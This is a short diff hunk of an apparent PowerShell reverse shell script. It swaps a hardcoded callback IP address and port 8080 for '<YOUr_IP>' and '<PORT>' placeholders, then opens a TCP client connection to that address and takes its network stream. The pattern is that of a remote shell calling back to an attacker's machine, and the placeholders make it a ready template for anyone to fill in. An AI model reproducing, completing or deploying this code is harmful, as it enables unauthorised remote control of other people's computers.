@@ -4,8 +4,8 @@ function cleanup {
     exit
 }
 
-$address = '13.201.46.41'
-$port = '8080'
+$address = '<YOUr_IP>'
+$port = '<PORT>'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
